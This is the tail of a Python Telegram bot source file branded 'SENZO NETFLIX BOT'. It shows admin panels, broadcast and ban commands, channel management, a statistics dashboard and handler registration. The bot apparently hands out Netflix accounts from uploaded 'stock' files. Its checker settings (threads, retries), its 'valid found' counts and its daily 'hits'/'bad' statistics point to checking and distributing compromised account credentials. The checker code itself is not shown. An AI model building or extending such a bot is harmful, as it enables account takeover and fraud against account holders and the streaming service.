    keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
    text += "\n\n👨‍💻 **Developer:** @Senzo268"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN,
    )

async def admin_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    messages = get_pending_messages()
    if not messages:
        await query.edit_message_text("📩 **No pending messages.**\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
        return
    
    text = "📩 **PENDING MESSAGES**\n\n"
    keyboard = []
    
    for msg in messages[:10]:
        user = get_user(msg["user_id"])
        username = user.get("username", "Unknown") if user else "Unknown"
        text += f"#{msg['id']} | @{username} | {msg['message'][:30]}...\n"
        keyboard.append([InlineKeyboardButton(f"#{msg['id']} - Reply", callback_data=f"reply_msg_{msg['id']}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
    text += "\n\n👨‍💻 **Developer:** @Senzo268"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN,
    )

async def reply_message_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    msg_id = int(query.data.replace("reply_msg_", ""))
    
    await query.edit_message_text(
        f"📩 **Reply to Message #{msg_id}**\n\n"
        f"Send: `/reply {msg_id} <your message>`\n\n"
        f"👨‍💻 **Developer:** @Senzo268",
        parse_mode=ParseMode.MARKDOWN,
    )

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    users = get_all_users()
    
    page = context.user_data.get("users_page", 0)
    per_page = 15
    total_pages = (len(users) + per_page - 1) // per_page
    if page >= total_pages:
        page = total_pages - 1 if total_pages > 0 else 0
    
    start = page * per_page
    end = min(start + per_page, len(users))
    page_users = users[start:end]
    
    text = f"👥 **USERS LIST** (Page {page + 1}/{total_pages})\n\n"
    for u in page_users:
        status = "🚫 Banned" if u["is_banned"] else "✅ Active"
        admin = "⭐ Admin" if u["is_admin"] else "👤 User"
        text += f"▫️ @{u['username'] or u['first_name']} (ID: `{u['user_id']}`) - {status} - {admin}\n"
    
    text += f"\nTotal: {len(users)} users"
    
    keyboard = []
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("◀️ Previous", callback_data="users_prev"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("Next ▶️", callback_data="users_next"))
    if nav_row:
        keyboard.append(nav_row)
    
    keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
    text += "\n\n👨‍💻 **Developer:** @Senzo268"
    
    context.user_data["users_page"] = page
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN,
    )

async def users_nav_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    direction = query.data.replace("users_", "")
    current = context.user_data.get("users_page", 0)
    if direction == "prev":
        context.user_data["users_page"] = max(0, current - 1)
    elif direction == "next":
        context.user_data["users_page"] = current + 1
    await admin_users(update, context)

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    await query.edit_message_text(
        "📢 **BROADCAST**\n\n"
        "Send the message you want to broadcast to all users.\n\n"
        "⚠️ This will send a message to **ALL** users.\n\n"
        "👨‍💻 **Developer:** @Senzo268",
        parse_mode=ParseMode.MARKDOWN,
    )
    context.user_data["waiting_for_broadcast"] = True

async def admin_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    channels = get_channels()
    text = "⚙️ **MANAGE CHANNELS**\n\n"
    for ch in channels:
        status = "🟢 Active" if ch["is_active"] else "🔴 Inactive"
        text += f"▫️ {ch['channel_name']} - {status}\n"
    
    text += f"\nTotal: {len(channels)} channels"
    
    keyboard = [
        [InlineKeyboardButton("➕ Add Channel", callback_data="admin_add_channel")],
        [InlineKeyboardButton("❌ Remove Channel", callback_data="admin_remove_channel")],
        [InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")],
    ]
    text += "\n\n👨‍💻 **Developer:** @Senzo268"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN,
    )

async def admin_add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    await query.edit_message_text(
        "➕ **ADD CHANNEL**\n\n"
        "Send in this format:\n"
        "`channel_id, channel_name, invite_link`\n\n"
        "Example:\n"
        "`@mychannel, My Channel, https://t.me/mychannel`\n\n"
        "👨‍💻 **Developer:** @Senzo268",
        parse_mode=ParseMode.MARKDOWN,
    )
    context.user_data["waiting_for_channel"] = True

async def admin_remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    channels = get_channels()
    if not channels:
        await query.edit_message_text("❌ No channels to remove.\n\n👨‍💻 **Developer:** @Senzo268")
        return
    
    keyboard = []
    for ch in channels:
        keyboard.append([InlineKeyboardButton(f"❌ {ch['channel_name']}", callback_data=f"remove_ch_{ch['channel_id']}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_channels")])
    
    await query.edit_message_text(
        "Select channel to remove:\n\n👨‍💻 **Developer:** @Senzo268",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

async def remove_channel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    channel_id = query.data.replace("remove_ch_", "")
    remove_channel(channel_id)
    await query.edit_message_text(f"✅ Channel {channel_id} has been removed!\n\n👨‍💻 **Developer:** @Senzo268")

async def admin_stock_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    logs = get_stock_logs()
    if not logs:
        await query.edit_message_text("📊 No stock uploads yet.\n\n👨‍💻 **Developer:** @Senzo268")
        return
    
    text = "📊 **STOCK UPLOAD LOGS**\n\n"
    for log in logs:
        text += f"📁 {log['file_name']}\n   📅 {log['uploaded_at']}\n   🔍 Total: {log['total_found']} | ✅ Valid: {log['valid_found']}\n\n"
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")]]
    text += "\n👨‍💻 **Developer:** @Senzo268"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN,
    )

async def admin_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    stats = get_dashboard_stats()
    
    text = f"""
📈 **DASHBOARD**

━━━━━━━━━━━━━━━━━━━━━
👥 **USERS**
┌─────────────────────
│ Total: **{stats['total_users']}**
│ Active: **{stats['active_users']}**
└─────────────────────

📦 **ACCOUNTS**
┌─────────────────────
│ Available: **{stats['available']}**
│ Working: **{stats['total_working']}**
│ Assigned: **{stats['assigned']}**
└─────────────────────

📋 **REPORTS**
┌─────────────────────
│ Pending: **{stats['pending_reports']}**
│ Accepted: **{stats['accepted_reports']}**
│ Rejected: **{stats['rejected_reports']}**
└─────────────────────

📩 **MESSAGES**
┌─────────────────────
│ Pending: **{stats['pending_messages']}**
└─────────────────────

📊 **PLAN BREAKDOWN:**
"""
    for plan, count in stats.get('plan_counts', {}).items():
        text += f"│ {plan}: **{count}**\n"
    
    if stats.get('recent_stats'):
        text += "\n📅 **LAST 7 DAYS:**\n"
        for day in stats['recent_stats']:
            text += f"│ {day['date']}: ✅ {day['hits']} | ❌ {day['bad']}\n"
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")]]
    text += "\n\n👨‍💻 **Developer:** @Senzo268"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN,
    )

# ============================================================
# TEXT MESSAGE HANDLER
# ============================================================

async def handle_all_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    
    user = update.effective_user
    user_id = user.id
    text = update.message.text.strip()
    user_data = get_user(user_id)
    
    if user_data and user_data["is_banned"]:
        await update.message.reply_text("🚫 You are banned.")
        return
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            if text.startswith("/start"):
                await start(update, context)
                return
            
            await update.message.reply_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"❌ You cannot use other commands until you complete this report.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    if context.user_data.get("waiting_for_message"):
        msg_id = create_message(user_id, text)
        context.user_data["waiting_for_message"] = False
        
        await update.message.reply_text(
            "✅ **Message sent to admin!**\n\n"
            "You will receive a reply here when admin responds.\n\n"
            "👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN,
        )
        
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"📩 **New Message from User**\n\n"
                    f"User: @{user.username or 'NoUsername'} (ID: `{user_id}`)\n"
                    f"Message: {text}\n\n"
                    f"Use `/reply {msg_id} <your reply>` to respond.\n\n"
                    f"👨‍💻 **Developer:** @Senzo268",
                    parse_mode=ParseMode.MARKDOWN,
                )
            except:
                pass
        return
    
    if context.user_data.get("waiting_for_channel") and user_id in ADMIN_IDS:
        parts = [p.strip() for p in text.split(",")]
        if len(parts) == 3:
            channel_id, channel_name, invite_link = parts
            add_channel(channel_id, channel_name, invite_link)
            context.user_data["waiting_for_channel"] = False
            await update.message.reply_text(f"✅ Channel **{channel_name}** added!\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(
                "❌ Invalid format. Use: `channel_id, channel_name, invite_link`\n\n"
                "👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
        return
    
    if context.user_data.get("waiting_for_broadcast") and user_id in ADMIN_IDS:
        context.user_data["waiting_for_broadcast"] = False
        users = get_all_users()
        sent = 0
        failed = 0
        
        progress = await update.message.reply_text(
            f"⏳ Sending broadcast to **{len(users)}** users...",
            parse_mode=ParseMode.MARKDOWN,
        )
        
        for u in users:
            if u["is_banned"]:
                continue
            try:
                await context.bot.send_message(u["user_id"], text + "\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
                sent += 1
            except:
                failed += 1
            await asyncio.sleep(0.05)
        
        await progress.edit_text(
            f"✅ **BROADCAST COMPLETE!**\n\n"
            f"✅ Sent: **{sent}**\n"
            f"❌ Failed: **{failed}**\n"
            f"📊 Total Users: **{len(users)}**\n\n"
            f"👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    
    if user_id in ADMIN_IDS:
        if text.startswith("/reply "):
            parts = text.split(" ", 2)
            if len(parts) >= 3:
                try:
                    msg_id = int(parts[1])
                    reply_text = parts[2]
                    target_user = get_message_sender(msg_id)
                    if target_user:
                        reply_to_message(msg_id, reply_text)
                        await context.bot.send_message(
                            target_user,
                            f"📩 **Admin Reply:**\n\n{reply_text}\n\n"
                            f"👨‍💻 **Developer:** @Senzo268",
                            parse_mode=ParseMode.MARKDOWN,
                        )
                        await update.message.reply_text("✅ Reply sent to user!\n\n👨‍💻 **Developer:** @Senzo268")
                    else:
                        await update.message.reply_text("❌ Message ID not found.")
                except:
                    await update.message.reply_text(
                        "❌ Invalid format. Use: `/reply <msg_id> <message>`\n\n"
                        "👨‍💻 **Developer:** @Senzo268",
                        parse_mode=ParseMode.MARKDOWN,
                    )
            return
        
        if text.startswith("/ban "):
            parts = text.split()
            if len(parts) == 2 and parts[1].isdigit():
                ban_user(int(parts[1]), user_id)
                await update.message.reply_text(f"✅ User `{parts[1]}` has been banned!\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
            return
        
        if text.startswith("/unban "):
            parts = text.split()
            if len(parts) == 2 and parts[1].isdigit():
                unban_user(int(parts[1]))
                await update.message.reply_text(f"✅ User `{parts[1]}` has been unbanned!\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
            return
    
    assigned = get_assigned_account(user_id)
    
    keyboard = [
        [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
    ]
    
    if assigned:
        keyboard.append([
            InlineKeyboardButton("✅ Working", callback_data="working"),
            InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
        ])
    
    keyboard.append([
        InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
        InlineKeyboardButton("📊 My Status", callback_data="my_status"),
    ])
    
    if user_data and (user_data["is_admin"] or user_id in ADMIN_IDS):
        keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
    
    await update.message.reply_text(
        "🤖 Use the buttons below:\n\n👨‍💻 **Developer:** @Senzo268",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

# ============================================================
# ERROR HANDLER
# ============================================================

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ An error occurred. Please try again.\n\n"
                "👨‍💻 **Developer:** @Senzo268"
            )
    except:
        pass

# ============================================================
# HEALTH CHECK SERVER FOR RAILWAY
# ============================================================

class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/health':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def start_health_server():
    try:
        port = int(os.environ.get('PORT', 8080))
        server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
        print(f"✅ Health check server running on port {port}")
        server.serve_forever()
    except Exception as e:
        print(f"⚠️ Health check server: {e}")

# ============================================================
# MAIN
# ============================================================

def main():
    print("=" * 70)
    print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION")
    print("=" * 70)
    print(f"📊 Database: {'Turso' if db.use_turso else 'SQLite'}")
    print(f"👤 Admins: {ADMIN_IDS}")
    print(f"⏳ Cooldown: {WORKING_COOLDOWN_MINUTES} min")
    print(f"📦 Max Accounts: {MAX_ACCOUNTS_PER_USER}")
    print(f"🔍 Threads: {MAX_CHECK_THREADS}")
    print(f"🔄 Retries: {MAX_RETRIES}")
    print(f"🌐 Health Check: http://0.0.0.0:{os.environ.get('PORT', 8080)}/health")
    print("=" * 70)
    
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ BOT_TOKEN not set! Please set BOT_TOKEN in .env file")
        return
    
    health_thread = threading.Thread(target=start_health_server, daemon=True)
    health_thread.start()
    time.sleep(1)
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", start))
    application.add_handler(CommandHandler("ban", handle_all_text_messages))
    application.add_handler(CommandHandler("unban", handle_all_text_messages))
    application.add_handler(CommandHandler("reply", handle_all_text_messages))
    
    # Callbacks
    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
    application.add_handler(CallbackQueryHandler(working_callback, pattern="^working$"))
    application.add_handler(CallbackQueryHandler(notworking_callback, pattern="^notworking$"))
    application.add_handler(CallbackQueryHandler(report_account, pattern="^report_"))
    application.add_handler(CallbackQueryHandler(contact_admin, pattern="^contact$"))
    application.add_handler(CallbackQueryHandler(my_status, pattern="^my_status$"))
    application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_menu$"))
    
    # Admin callbacks
    application.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(admin_upload, pattern="^admin_upload$"))
    application.add_handler(CallbackQueryHandler(admin_reports, pattern="^admin_reports$"))
    application.add_handler(CallbackQueryHandler(admin_messages, pattern="^admin_messages$"))
    application.add_handler(CallbackQueryHandler(admin_users, pattern="^admin_users$"))
    application.add_handler(CallbackQueryHandler(users_nav_callback, pattern="^users_"))
    application.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
    application.add_handler(CallbackQueryHandler(admin_channels, pattern="^admin_channels$"))
    application.add_handler(CallbackQueryHandler(admin_add_channel, pattern="^admin_add_channel$"))
    application.add_handler(CallbackQueryHandler(admin_remove_channel, pattern="^admin_remove_channel$"))
    application.add_handler(CallbackQueryHandler(admin_stock_logs, pattern="^admin_stock_logs$"))
    application.add_handler(CallbackQueryHandler(admin_dashboard, pattern="^admin_dashboard$"))
    application.add_handler(CallbackQueryHandler(remove_channel_callback, pattern="^remove_ch_"))
    application.add_handler(CallbackQueryHandler(review_report_callback, pattern="^review_"))
    application.add_handler(CallbackQueryHandler(reply_message_callback, pattern="^reply_msg_"))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.PHOTO, handle_screenshot))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    application.add_handler(MessageHandler(filters.TEXT, handle_all_text_messages))
    
    application.add_error_handler(error_handler)
    
    try:
        print("🚀 Starting bot polling...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"⚠️ Error: {e}")

if __name__ == "__main__":
    main()
